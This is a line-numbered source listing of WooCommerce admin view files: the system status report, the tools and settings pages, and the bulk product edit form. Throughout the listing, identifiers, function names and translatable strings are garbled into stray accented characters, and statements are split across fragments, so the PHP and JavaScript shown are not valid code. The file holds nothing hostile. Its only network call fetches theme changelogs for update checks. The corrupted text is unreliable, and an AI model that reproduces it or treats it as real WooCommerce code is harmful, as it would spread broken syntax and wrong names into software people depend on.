$wc_¶ugšs
[] = 
$¶ugš_Çme
 . ' ' . 
	`__
Ğ'by', 'woocomm”û' ) . ' ' . 
$¶ugš_d©a
['AuthÜ'] . ' ' . __Ğ'v”siÚ', 'woocomm”û' ) . ' ' . $¶ugš_d©a['V”siÚ'] . 
$v”siÚ_¡ršg
;

262 
	}
}

264 iàĞĞ
	g$wc_¶ugšs
 ) == 0 )

265 
echo
 '-';

267 
echo
 
im¶ode
Ğ', <br/>', 
$wc_¶ugšs
 );

269 ?></
	gtd
>

270 </
	gŒ
>

271 </
	gtbody
>

273 <
	gth—d
>

274 <
	gŒ
>

275 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'S‘tšgs', 'woocomm”û' ); ?></
	gth
>

276 </
	gŒ
>

277 </
	gth—d
>

279 <
	gtbody
>

280 <
	gŒ
>

281 <
	gtd
><?
php
 
_e
Ğ'FÜû SSL','woocomm”û' ); ?>:</
td
>

282 <
td
><?
php
 
echo
 
g‘_İtiÚ
Ğ'woocomm”û_fÜû_s¦_checkout' ) ==ğ'yes' ? '<m¬k cÏss="yes">'.
__
Ğ'Yes', 'woocomm”û' ).'</m¬k>' : '<m¬k cÏss="no">'.__Ğ'No', 'woocomm”û' ).'</m¬k>'; ?></
	gtd
>

283 </
	gŒ
>

284 </
	gtbody
>

286 <
	gth—d
>

287 <
	gŒ
>

288 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'WC Pages', 'woocomm”û' ); ?></
	gth
>

289 </
	gŒ
>

290 </
	gth—d
>

292 <
	gtbody
>

293 <?
php


294 
	g$check_·ges
 = 
¬¿y
(

295 
_x
Ğ'Shİ Ba£', 'Pag£‰šg', 'woocomm”û' ) => 
¬¿y
(

299 
_x
Ğ'C¬t', 'Pag£‰šg', 'woocomm”û' ) => 
¬¿y
(

301 'shÜtcode' => '[' . 
­¶y_f‹rs
( 'woocommerce_cart_shortcode_tag', 'woocommerce_cart' ) . ']'

303 
_x
Ğ'Checkout', 'Pag£‰šg', 'woocomm”û' ) => 
¬¿y
(

305 'shÜtcode' => '[' . 
­¶y_f‹rs
( 'woocommerce_checkout_shortcode_tag', 'woocommerce_checkout' ) . ']'

307 
_x
Ğ'My AccouÁ', 'Pag£‰šg', 'woocomm”û' ) => 
¬¿y
(

309 'shÜtcode' => '[' . 
­¶y_f‹rs
( 'woocommerce_my_account_shortcode_tag', 'woocommerce_my_account' ) . ']'

313 
	g$®t
 = 1;

315 
fÜ—ch
 ( 
$check_·ges
 
as
 
$·ge_Çme
 => 
$v®ues
 ) {

317 iàĞ
$®t
 =ğ1 ) 
echo
 '<Œ>'; 
	gecho
 '<tr>';

319 
	gecho
 '<td>' . 
esc_html
Ğ
$·ge_Çme
 ) . ':</td><td>';

321 
	g$”rÜ
 = 
çl£
;

323 
	g$·ge_id
 = 
g‘_İtiÚ
Ğ
$v®ues
['option'] );

326 iàĞ! 
	g$·ge_id
 ) {

327 
	gecho
 '<m¬k cÏss="”rÜ">' . 
__
( 'Page‚ot set', 'woocommerce' ) . '</mark>';

328 
	g$”rÜ
 = 
Œue
;

332 iàĞ
	g$v®ues
['shortcode'] ) {

333 
	g$·ge
 = 
g‘_po¡
Ğ
$·ge_id
 );

335 iàĞ
em±y
Ğ
$·ge
 ) ) {

337 
	gecho
 '<m¬k cÏss="”rÜ">' . 
¥rštf
Ğ
__
( 'Page does‚otƒxist', 'woocommerce' ) ) . '</mark>';

338 
	g$”rÜ
 = 
Œue
;

340 } iàĞ! 
¡r¡r
Ğ
$·ge
->
po¡_cÚ‹Á
, 
$v®ues
['shortcode'] ) ) {

342 
	gecho
 '<m¬k cÏss="”rÜ">' . 
¥rštf
Ğ
__
Ğ'PagdÛ nÙ cÚšhshÜtcode: %s', 'woocomm”û' ), 
$v®ues
['shortcode'] ) . '</mark>';

343 
	g$”rÜ
 = 
Œue
;

350 iàĞ! 
	g$”rÜ
 ) 
	gecho
 '<m¬k cÏss="yes">#' . 
absšt
Ğ
$·ge_id
 ) . ' - ' . 
¡r_»¶aû
Ğ
home_u¾
(), '', 
g‘_³rm®šk
( $page_id ) ) . '</mark>';

352 
	gecho
 '</td></tr>';

354 
	g$®t
 = 
$®t
 * -1;

357 </
	gtbody
>

359 <
	gth—d
>

360 <
	gŒ
>

361 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'WC TaxÚom›s', 'woocomm”û' ); ?></
	gth
>

362 </
	gŒ
>

363 </
	gth—d
>

365 <
	gtbody
>

366 <
	gŒ
>

367 <
	gtd
><?
php
 
_e
Ğ'Ord” Stu£s', 'woocomm”û' ); ?>:</
td
>

368 <
td
><?
php


369 
$di¥Ïy_‹rms
 = 
¬¿y
();

370 
	g$‹rms
 = 
g‘_‹rms
Ğ'shİ_Üd”_¡©us', 
¬¿y
( 'hide_empty' => 0 ) );

371 
fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 )

372 
	g$di¥Ïy_‹rms
[] = 
$‹rm
->
Çme
 . ' (' . $‹rm->
¦ug
 . ')';

373 
echo
 
im¶ode
Ğ', ', 
¬¿y_m­
Ğ'esc_html', 
$di¥Ïy_‹rms
 ) );

374 ?></
	gtd
>

375 </
	gŒ
>

376 <
	gŒ
>

377 <
	gtd
><?
php
 
_e
Ğ'Produù Ty³s', 'woocomm”û' ); ?>:</
td
>

378 <
td
><?
php


379 
$di¥Ïy_‹rms
 = 
¬¿y
();

380 
	g$‹rms
 = 
g‘_‹rms
Ğ'´oduù_ty³', 
¬¿y
( 'hide_empty' => 0 ) );

381 
fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 )

382 
	g$di¥Ïy_‹rms
[] = 
$‹rm
->
Çme
 . ' (' . $‹rm->
¦ug
 . ')';

383 
echo
 
im¶ode
Ğ', ', 
¬¿y_m­
Ğ'esc_html', 
$di¥Ïy_‹rms
 ) );

384 ?></
	gtd
>

385 </
	gŒ
>

386 </
	gtbody
>

388 <
	gth—d
>

389 <
	gŒ
>

390 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'Theme', 'woocomm”û' ); ?></
	gth
>

391 </
	gŒ
>

392 </
	gth—d
>

394 <?
php


395 
	g$aùive_theme
 = 
wp_g‘_theme
();

396 iàĞ
	g$aùive_theme
->{'Author URI'} == 'http://www.woothemes.com' ) :

398 
$theme_dœ
 = 
sub¡r
Ğ
¡¹Şow”
Ğ
¡r_»¶aû
Ğ' ','', 
$aùive_theme
->
Name
 ) ), 0, 45 );

400 iàĞ
	gçl£
 ==ğĞ
$theme_v”siÚ_d©a
 = 
g‘_Œªs›Á
Ğ
$theme_dœ
 . '_version_data' ) ) ) :

402 
$theme_chªg–og
 = 
wp_»mÙe_g‘
Ğ'h‰p://dzv365zjfbd8v.şoudäÚt.Ãt/chªg–ogs/' . 
$theme_dœ
 . '/changelog.txt' );

403 
	g$ş_lšes
 = 
ex¶ode
Ğ"\n", 
wp_»mÙe_»Œ›ve_body
Ğ
$theme_chªg–og
 ) );

404 iàĞ! 
	$em±y
Ğ
$ş_lšes
 ) ) :

406 
	`fÜ—ch
 ( 
$ş_lšes
 
as
 
$lše_num
 => 
$ş_lše
 ) {

407 iàĞ
	`´eg_m©ch
Ğ'/^[0-9]/', 
$ş_lše
 ) ) :

409 
$theme_d©e
 = 
	`¡r_»¶aû
Ğ'.' , '-' , 
	`Œim
Ğ
	`sub¡r
Ğ
$ş_lše
 , 0 , 
	`¡½os
( $cl_line , '-' ) ) ) );

410 
$theme_v”siÚ
 = 
	`´eg_»¶aû
Ğ'~[^0-9,.]~' , '' ,
	`¡ri¡r
Ğ
$ş_lše
 , "version" ) );

411 
$theme_upd©e
 = 
	`Œim
Ğ
	`¡r_»¶aû
Ğ"*" , "" , 
$ş_lšes
[ 
$lše_num
 + 1 ] ) );

412 
$theme_v”siÚ_d©a
 = 
	`¬¿y
Ğ'd©e' => 
$theme_d©e
 , 'v”siÚ' => 
$theme_v”siÚ
 , 'upd©e' => 
$theme_upd©e
 , 'chªg–og' => 
$theme_chªg–og
 );

413 
	`£t_Œªs›Á
Ğ
$theme_dœ
 . '_v”siÚ_d©a', 
$theme_v”siÚ_d©a
 , 60*60*12 );

416 
’dif
;

417 
	}
}

419 
	g’dif
;

421 
	g’dif
;

423 
	g’dif
;

425 <
	gtbody
>

426 <
	gŒ
>

427 <
	gtd
><?
php
 
_e
Ğ'ThemName', 'woocomm”û' ); ?>:</
td
>

428 <
td
><?
php


429 
echo
 
$aùive_theme
->
Name
;

430 ?></
	gtd
>

431 </
	gŒ
>

432 <
	gŒ
>

433 <
	gtd
><?
php
 
_e
Ğ'ThemV”siÚ', 'woocomm”û' ); ?>:</
td
>

434 <
td
><?
php


435 
echo
 
$aùive_theme
->
V”siÚ
;

437 iàĞ! 
em±y
Ğ
$theme_v”siÚ_d©a
['v”siÚ'] ) && 
v”siÚ_com·»
Ğ$theme_v”siÚ_d©a['v”siÚ'], 
$aùive_theme
->
V”siÚ
, '!=' ) )

438 
	gecho
 ' &ndash; <¡rÚg styË="cŞÜ:»d;">' . 
	g$theme_v”siÚ_d©a
['v”siÚ'] . ' ' . 
__
( 'is‡vailable', 'woocommerce' ) . '</strong>';

439 ?></
	gtd
>

440 </
	gŒ
>

441 <
	gŒ
>

442 <
	gtd
><?
php
 
_e
Ğ'AuthÜ URL', 'woocomm”û' ); ?>:</
td
>

443 <
td
><?
php


444 
echo
 
$aùive_theme
->{'Author URI'};

445 ?></
	gtd
>

446 </
	gŒ
>

447 </
	gtbody
>

449 <
	gth—d
>

450 <
	gŒ
>

451 <
th
 
	gcŞ¥ª
="2"><?
php
 
_e
Ğ'Tem¶©es', 'woocomm”û' ); ?></
	gth
>

452 </
	gŒ
>

453 </
	gth—d
>

455 <
	gtbody
>

456 <
	gŒ
>

457 <?
php


459 
	g$‹m¶©e_·ths
 = 
­¶y_f‹rs
Ğ'woocomm”û_‹m¶©e_ov”rides_sÿn_·ths', 
¬¿y
Ğ'WooComm”û' => 
WC
()->
¶ugš_·th
() . '/templates/' ) );

460 
	g$found_fes
 = 
¬¿y
();

462 
fÜ—ch
 ( 
$‹m¶©e_·ths
 
as
 
$¶ugš_Çme
 => 
$‹m¶©e_·th
 )

463 
$sÿÂed_fes
[ 
$¶ugš_Çme
 ] = 
$this
->
sÿn_‹m¶©e_fes
Ğ
$‹m¶©e_·th
 );

465 
fÜ—ch
 ( 
$sÿÂed_fes
 
as
 
$¶ugš_Çme
 => 
$fes
 ) {

466 
fÜ—ch
 ( 
$fes
 
as
 
$fe
 ) {

467 iàĞ
fe_exi¡s
Ğ
g‘_¡yËsh“t_dœeùÜy
(è. '/' . 
$fe
 ) ) {

468 
$theme_fe
 = 
g‘_¡yËsh“t_dœeùÜy
(è. '/' . 
$fe
;

469 } 
–£if
 ( 
fe_exi¡s
Ğ
g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$fe
 ) ) {

470 
	g$theme_fe
 = 
g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$fe
;

471 } 
–£if
 ( 
fe_exi¡s
Ğ
g‘_‹m¶©e_dœeùÜy
(è. '/' . 
$fe
 ) ) {

472 
	g$theme_fe
 = 
g‘_‹m¶©e_dœeùÜy
(è. '/' . 
$fe
;

473 } 
–£if
Ğ
fe_exi¡s
Ğ
g‘_‹m¶©e_dœeùÜy
(è. '/woocomm”û/' . 
$fe
 ) ) {

474 
	g$theme_fe
 = 
g‘_‹m¶©e_dœeùÜy
(è. '/woocomm”û/' . 
$fe
;

476 
	g$theme_fe
 = 
çl£
;

479 iàĞ
	g$theme_fe
 ) {

480 
	g$cÜe_v”siÚ
 = 
$this
->
g‘_fe_v”siÚ
Ğ
WC
()->
¶ugš_·th
(è. '/‹m¶©es/' . 
$fe
 );

481 
	g$theme_v”siÚ
 = 
$this
->
g‘_fe_v”siÚ
Ğ
$theme_fe
 );

483 iàĞ
	g$cÜe_v”siÚ
 && ( 
em±y
Ğ
$theme_v”siÚ
 ) || 
v”siÚ_com·»
Ğ$theme_v”siÚ, 
$cÜe_v”siÚ
, '<' ) ) ) {

484 
	g$found_fes
[ 
$¶ugš_Çme
 ][] = 
¥rštf
Ğ
__
Ğ'<code>%s</code> v”siÚ <¡rÚg styË="cŞÜ:»d">%s</¡rÚg> i ouˆoàd©e. ThcÜv”siÚ i %s', 'woocomm”û' ), 
ba£Çme
Ğ
$theme_fe
 ), 
$theme_v”siÚ
 ? $theme_v”siÚ : '-', 
$cÜe_v”siÚ
 );

486 
	g$found_fes
[ 
$¶ugš_Çme
 ][] = 
¥rštf
Ğ'<code>%s</code>', 
ba£Çme
Ğ
$theme_fe
 ) );

492 iàĞ
	g$found_fes
 ) {

493 
fÜ—ch
 ( 
$found_fes
 
as
 
$¶ugš_Çme
 => 
$found_¶ugš_fes
 ) {

495 <
td
><?
php
 
_e
Ğ'Tem¶©Ov”rides', 'woocomm”û' ); ?> (<?ph°
echo
 
	g$¶ugš_Çme
; ?>):</td>

496 <
td
><?
php
 
echo
 
im¶ode
Ğ', <br/>', 
$found_¶ugš_fes
 ); ?></
	gtd
>

497 <?
	gphp


501 <
	gtd
><?
php
 
_e
Ğ'Tem¶©Ov”rides', 'woocomm”û' ); ?>:</
td
>

502 <
td
><?
php
 
_e
Ğ'NØov”ride ´e£Á iÀtheme.', 'woocomm”û' ); ?></
	gtd
>

503 <?
	gphp


506 </
	gŒ
>

507 </
	gtbody
>

509 </
	gbË
>

511 <
süt
 
	gty³
="text/javascript">

518 
jQu”y
.
wc_¡rPad
 = 
	$funùiÚ
(
i
,
l
,
s
,
w
) {

519 
v¬
 
o
 = 
i
.
	`toSŒšg
();

520 ià(!
s
) { s = '0'; }

521 
o
.
Ëngth
 < 
l
) {

523 if(
w
 == 'undefined'){

524 
o
 = 
s
 + o;

526 
o
 = o + 
s
;

529  
o
;

530 
	}
};

533 
jQu”y
('a.debug-»pÜt').
şick
(
	$funùiÚ
(){

535 
v¬
 
»pÜt
 = "";

537 
	`jQu”y
('.wc_¡©us_bËh—d, .wc_¡©us_bËbody').
	`—ch
(
	`funùiÚ
(){

539 iàĞ
	`jQu”y
Ğ
this
 ).
	`is
('thead') ) {

541 
»pÜt
 =„•Üˆ+ "\n### " + 
jQu”y
.
	`Œim
Ğ
	`jQu”y
Ğ
this
 ).
	`‹xt
() ) + " ###\n\n";

545 
	`jQu”y
('Œ', jQu”yĞ
this
 )).
	`—ch
(
	`funùiÚ
(){

547 
v¬
 
the_Çme
 = 
jQu”y
.
	`wc_¡rPad
ĞjQu”y.
	`Œim
Ğ
	`jQu”y
Ğ
this
 ).
	`fšd
('td:eq(0)').
	`‹xt
() ), 25, ' ' );

548 
v¬
 
the_v®ue
 = 
jQu”y
.
	`Œim
Ğ
	`jQu”y
Ğ
this
 ).
	`fšd
('td:eq(1)').
	`‹xt
() );

549 
v¬
 
v®ue_¬¿y
 = 
the_v®ue
.
	`¥l™
( ', ' );

551 iàĞ
v®ue_¬¿y
.
Ëngth
 > 1 ){

555 
v¬
 
ouut
 = '';

556 
v¬
 
‹mp_lše
 ='';

557 
jQu”y
.
	`—ch
Ğ
v®ue_¬¿y
, 
	`funùiÚ
(
key
, 
lše
){

558 
v¬
 
b
 = ( 
key
 == 0 )?0:25;

559 
‹mp_lše
 =emp_lš+ 
jQu”y
.
	`wc_¡rPad
Ğ'', 
b
, ' ', 'f' ) + 
lše
 +'\n';

562 
the_v®ue
 = 
‹mp_lše
;

565 
»pÜt
 =„•Üˆ+''+ 
the_Çme
 + 
the_v®ue
 + "\n";

571 
Œy
 {

572 
	`jQu”y
("#debug-»pÜt").
	`¦ideDown
();

573 
	`jQu”y
("#debug-»pÜˆ‹x»a").
	`v®
Ğ
»pÜt
 ).
	`focus
().
	`£Ëù
();

574 
	`jQu”y
(
this
).
	`çdeOut
();

575  
çl£
;

576 } 
	`ÿtch
(
e
){ 
cÚsŞe
.
	`log
(ƒ ); }

578  
çl£
;

579 
	}
});

580 </
	gsüt
>

	@includes/admin/views/html-admin-page-status-tools.php

1 <
fÜm
 
	gm‘hod
="po¡" 
aùiÚ
="options.php">

2 <?
php
 
£‰šgs_f›lds
( 'woocommerce_status_settings_fields' ); ?>

3 <?
php
 
	g$İtiÚs
 = 
wp_·r£_¬gs
Ğ
g‘_İtiÚ
Ğ'woocomm”û_¡©us_İtiÚs', 
¬¿y
() ),‡rray( 'uninstall_data' => 0, 'template_debug_mode' => 0 ) ); ?>

4 <
bË
 
	gşass
="wc_¡©us_bË wideçt" 
ûÎ¥acšg
="0">

5 <
th—d
 
şass
="tools">

6 <
Œ
>

7 <
th
 
cŞ¥ª
="2"><?
php
 
_e
Ğ'ToŞs', 'woocomm”û' ); ?></
	gth
>

8 </
	gŒ
>

9 </
	gth—d
>

10 <
tbody
 
	gşass
="tools">

11 <?
php
 
fÜ—ch
Ğ
$toŞs
 
as
 
$aùiÚ
 => 
$toŞ
 ) { ?>

12 <
Œ
>

13 <
td
><?
php
 
echo
 
esc_html
Ğ
$toŞ
['Çme'] ); ?></
	gtd
>

14 <
	gtd
>

15 <
	gp
>

16 <
a
 
	gh»f
="<?ph°echØwp_nÚû_u¾Ğadmš_u¾('admš.php?·ge=wc-¡©us&bñoŞs&aùiÚ=' . $aùiÚ ), 'debug_aùiÚ' ); ?>" 
şass
="bu‰Ú"><?
php
 
echo
 
esc_html
Ğ
$toŞ
['bu‰Ú'] ); ?></
	ga
>

17 <
¥ª
 
	gşass
="desütiÚ"><?
php
 
echo
 
wp_k£s_po¡
Ğ
$toŞ
['desc'] ); ?></
	g¥ª
>

18 </
	gp
>

19 </
	gtd
>

20 </
	gŒ
>

21 <?
	gphp
 } ?>

22 <
	gŒ
>

23 <
	gtd
><?
php
 
_e
( 'Template Debug Mode', 'woocommerce' ); ?></td>

24 <
	gtd
>

25 <
	gp
>

26 <
	gÏb–
><
šput
 
	gty³
="checkbox" 
şass
="checkbox" 
Çme
="woocomm”û_¡©us_İtiÚs[‹m¶©e_debug_mode]" 
v®ue
="1" <?
php
 
checked
Ğ'1', 
$İtiÚs
['‹m¶©e_debug_mode'] ); ?> /> <?ph°
_e
( 'Enabled', 'woocommerce' ); ?></label>

27 </
	gp
>

28 <
	gp
>

29 <
¥ª
 
	gşass
="desütiÚ"><?
php
 
_e
Ğ'Thi toŞ wÈdi§bËem¶©ov”ride fÜ†ogged-š‡dmši¡¿tÜ fÜ debuggšg…u½o£s.', 'woocomm”û' ); ?></
	g¥ª
>

30 </
	gp
>

31 </
	gtd
>

32 </
	gŒ
>

33 <
	gŒ
>

34 <
	gtd
><?
php
 
_e
( 'Remove…ostypes on uninstall', 'woocommerce' ); ?></td>

35 <
	gtd
>

36 <
	gp
>

37 <
	gÏb–
><
šput
 
	gty³
="checkbox" 
şass
="checkbox" 
Çme
="woocomm”û_¡©us_İtiÚs[unš¡®l_d©a]" 
v®ue
="1" <?
php
 
checked
Ğ'1', 
$İtiÚs
['unš¡®l_d©a'] ); ?> /> <?ph°
_e
( 'Enabled', 'woocommerce' ); ?></label>

38 </
	gp
>

39 <
	gp
>

40 <
¥ª
 
	gşass
="desütiÚ"><?
php
 
_e
Ğ'Thi toŞ wÈd–‘®È´oduù‡nd ord”…o¡ d©¨wh’ unš¡®lšg vŸ Plugš > D–‘e.', 'woocomm”û' ); ?></
	g¥ª
>

41 </
	gp
>

42 </
	gtd
>

43 </
	gŒ
>

44 </
	gtbody
>

45 </
	gbË
>

46 <
p
 
	gşass
="submit">

47 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú-´im¬y" 
v®ue
="<?phpƒsc_attr_e( 'Save Changes', 'woocommerce' ) ?>" />

48 </
p
>

49 </
fÜm
>

	@includes/admin/views/html-admin-page-status.php

1 <
div
 
	gşass
="wrap woocommerce">

2 <
div
 
şass
="icÚ32 icÚ32-woocomm”û-¡©us" 
id
="icÚ-woocomm”û"><
br
 /></div><
h2
 class="nav-tab-wrapper woo-nav-tab-wrapper">

3 <?
php


4 
$bs
 = 
¬¿y
(

5 '¡©us' => 
__
( 'System Status', 'woocommerce' ),

6 'toŞs' => 
__
( 'Tools', 'woocommerce' ),

8 
fÜ—ch
 ( 
$bs
 
as
 
$Çme
 => 
$Ïb–
 ) {

9 
echo
 '<¨h»f="' . 
admš_u¾
Ğ'admš.php?·ge=wc-¡©us&b=' . 
$Çme
 ) . '" class="nav-tab ';

10 iàĞ
	g$cu¼’t_b
 =ğ
$Çme
 ) 
echo
 'nav-tab-active';

11 
	gecho
 '">' . 
	g$Ïb–
 . '</a>';

14 </
	gh2
><
	gbr
/>

15 <?
php


16  
$cu¼’t_b
 ) {

18 
$this
->
	`¡©us_toŞs
();

21 
$this
->
	`¡©us_»pÜt
();

23 
	}
}

25 </
	gdiv
>

	@includes/admin/views/html-admin-settings.php

1 <
div
 
	gşass
="wrap woocommerce">

2 <
fÜm
 
m‘hod
="po¡" 
id
="mašfÜm" 
aùiÚ
="" 
’ùy³
="multipart/form-data">

3 <
div
 
şass
="icÚ32 icÚ32-woocomm”û-£‰šgs" 
id
="icÚ-woocomm”û"><
br
 /></div><
h2
 class="nav-tab-wrapper woo-nav-tab-wrapper">

4 <?
php


5 
fÜ—ch
 ( 
$bs
 
as
 
$Çme
 => 
$Ïb–
 )

6 
echo
 '<¨h»f="' . 
admš_u¾
Ğ'admš.php?·ge=wc-£‰šgs&b=' . 
$Çme
 ) . '" cÏss="Çv-b ' . ( 
$cu¼’t_b
 =ğ$Çm? 'Çv-b-aùive' : '' ) . '">' . 
$Ïb–
 . '</a>';

8 
do_aùiÚ
( 'woocommerce_settings_tabs' );

10 </
	gh2
>

12 <?
php


13 
do_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$cu¼’t_b
 );

14 
do_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$cu¼’t_b
 );

15 
do_aùiÚ
Ğ'woocomm”û_£‰šgs_bs_' . 
$cu¼’t_b
 );

18 <
p
 
	gşass
="submit">

19 <?
php
 iàĞ! 
is£t
Ğ
$GLOBALS
['hide_save_button'] ) ) : ?>

20 <
šput
 
Çme
="§ve" 
şass
="bu‰Ú-´im¬y" 
ty³
="subm™" 
v®ue
="<?php _e( 'Save changes', 'woocommerce' ); ?>" />

21 <?
php
 
’dif
; ?>

22 <
šput
 
	gty³
="hidd’" 
Çme
="subb" 
id
="last_tab" />

23 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-settings' ); ?>

24 </
	gp
>

25 </
	gfÜm
>

26 </
	gdiv
>

	@includes/admin/views/html-bulk-edit-product.php

1 <
f›ld£t
 
	gşass
="inline-edit-col-right">

2 <
div
 
id
="woocomm”û-f›lds-bulk" 
şass
="inline-edit-col">

4 <
h4
><?
php
 
_e
Ğ'Produù D©a', 'woocomm”û' ); ?></
	gh4
>

6 <?
php
 
do_aùiÚ
( 'woocommerce_product_bulk_edit_start' ); ?>

8 <
div
 
	gşass
="inline-edit-group">

9 <
Ïb–
 
şass
="alignleft">

10 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	g¥ª
>

11 <
¥ª
 
	gşass
="input-text-wrap">

12 <
£Ëù
 
şass
="chªge_»guÏr_´iû chªge_to" 
Çme
="change_regular_price">

13 <?
php


14 
$İtiÚs
 = 
¬¿y
(

15 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

16 '1' => 
__
( 'Changeo:', 'woocommerce' ),

17 '2' => 
__
( 'Increase by (fixed‡mount or %):', 'woocommerce' ),

18 '3' => 
__
( 'Decrease by (fixed‡mount or %):', 'woocommerce' )

20 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

21 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">' . 
$v®ue
 . '</option>';

24 </
	g£Ëù
>

25 </
	g¥ª
>

26 </
	gÏb–
>

27 <
Ïb–
 
	gşass
="alignright">

28 <
šput
 
ty³
="‹xt" 
Çme
="_»guÏr_´iû" 
şass
="‹xˆ»guÏr_´iû" 
¶aûhŞd”
="<?ph°_eĞ'EÁ”…riû', 'woocomm”û' ); ?>" 
v®ue
="" />

29 </
Ïb–
>

30 </
div
>

32 <
div
 
şass
="inline-edit-group">

33 <
Ïb–
 
şass
="alignleft">

34 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'S®e', 'woocomm”û' ); ?></
	g¥ª
>

35 <
¥ª
 
	gşass
="input-text-wrap">

36 <
£Ëù
 
şass
="chªge_§Ë_´iû chªge_to" 
Çme
="change_sale_price">

37 <?
php


38 
$İtiÚs
 = 
¬¿y
(

39 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

40 '1' => 
__
( 'Changeo:', 'woocommerce' ),

41 '2' => 
__
( 'Increase by (fixed‡mount or %):', 'woocommerce' ),

42 '3' => 
__
( 'Decrease by (fixed‡mount or %):', 'woocommerce' ),

43 '4' => 
__
( 'Decrease„egular…rice by (fixed‡mount or %):', 'woocommerce' )

45 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

46 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">' . 
$v®ue
 . '</option>';

49 </
	g£Ëù
>

50 </
	g¥ª
>

51 </
	gÏb–
>

52 <
Ïb–
 
	gşass
="alignright">

53 <
šput
 
ty³
="‹xt" 
Çme
="_§Ë_´iû" 
şass
="‹xˆ§Ë_´iû" 
¶aûhŞd”
="<?ph°_eĞ'EÁ”…riû', 'woocomm”û' ); ?>" 
v®ue
="" />

54 </
Ïb–
>

55 </
div
>

57 <
Ïb–
>

58 <
¥ª
 
şass
="t™Ë"><?
php
 
_e
Ğ'Tax Stus', 'woocomm”û' ); ?></
	g¥ª
>

59 <
¥ª
 
	gşass
="input-text-wrap">

60 <
£Ëù
 
şass
="x_¡©us" 
Çme
="_tax_status">

61 <?
php


62 
$İtiÚs
 = 
¬¿y
(

63 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

64 'xabË' => 
__
( 'Taxable', 'woocommerce' ),

65 'shpšg' => 
__
( 'Shipping only', 'woocommerce' ),

66 'nÚe' => 
_x
( 'None', 'Tax status', 'woocommerce' )

68 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

69 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">' . 
$v®ue
 . '</option>';

72 </
	g£Ëù
>

73 </
	g¥ª
>

74 </
	gÏb–
>

76 <
	gÏb–
>

77 <
¥ª
 
	gşass
="t™Ë"><?
php
 
_e
Ğ'Tax CÏss', 'woocomm”û' ); ?></
	g¥ª
>

78 <
¥ª
 
	gşass
="input-text-wrap">

79 <
£Ëù
 
şass
="x_şass" 
Çme
="_tax_class">

80 <?
php


81 
$İtiÚs
 = 
¬¿y
(

82 '' => 
__
( 'â€” No Change â€”', 'woocommerce' ),

83 '¡ªd¬d' => 
__
( 'Standard', 'woocommerce' )

86 
	g$x_şas£s
 = 
¬¿y_f‹r
Ğ
¬¿y_m­
Ğ'Œim', 
ex¶ode
Ğ"\n", 
g‘_İtiÚ
( 'woocommerce_tax_classes' ) ) ) );

88 iàĞ
	g$x_şas£s
 )

89 
fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

90 
	g$İtiÚs
[ 
§n™ize_t™Ë
Ğ
$şass
 ) ] = 
esc_html
( $class );

92 
fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

93 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">' . 
$v®ue
 . '</option>';

96 </
	g£Ëù
>

97 </
	g¥ª
>

98 </
	gÏb–
>

100 <?
php
 iàĞ
	$wc_´oduù_weight_’abËd
() ) : ?>

101 <
div
 
şass
="inline-edit-group">

102 <
Ïb–
 
şass
="alignleft">

103 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'Weight', 'woocommerce' ); ?></span>

104 <
¥ª
 
şass
="input-text-wrap">

105 <
£Ëù
 
şass
="chªge_weighˆchªge_to" 
Çme
="change_weight">

106 <?
php


107 
$İtiÚs
 = 
	`¬¿y
(

108 '' => 
	`__
( 'â€” No Change â€”', 'woocommerce' ),

109 '1' => 
	`__
( 'Changeo:', 'woocommerce' )

111 
	`fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

112 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '">'. 
$v®ue
 .'</option>';

113 
	}
}

115 </
	g£Ëù
>

116 </
	g¥ª
>

117 </
	gÏb–
>

118 <
Ïb–
 
	gşass
="alignright">

119 <
šput
 
ty³
="‹xt" 
Çme
="_weight" 
şass
="‹xˆweight" 
¶aûhŞd”
="0.00" 
v®ue
="">

120 </
Ïb–
>

121 </
div
>

122 <?
php
 
’dif
; ?>

124 <?
php
 iàĞ
	$wc_´oduù_dim’siÚs_’abËd
() ) : ?>

125 <
div
 
şass
="inline-edit-group dimensions">

126 <
Ïb–
 
şass
="alignleft">

127 <
¥ª
 
şass
="t™Ë"><?
php
 
	`_e
( 'L/W/H', 'woocommerce' ); ?></span>

128 <
¥ª
 
şass
="input-text-wrap">

129 <
£Ëù
 
şass
="chªge_dim’siÚ chªge_to" 
Çme
="change_dimensions">

130 <?
php


131 
$İtiÚs
 = 
	`¬¿y
(

132 '' => 
	`__
( 'â€” No Change â€”', 'woocommerce' ),

133 '1' => 
	`__
( 'Changeo:', 'woocommerce' )

135 
	`fÜ—ch
 (
$İtiÚs
 
as
 
$key
 => 
$v®ue
) {

136 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
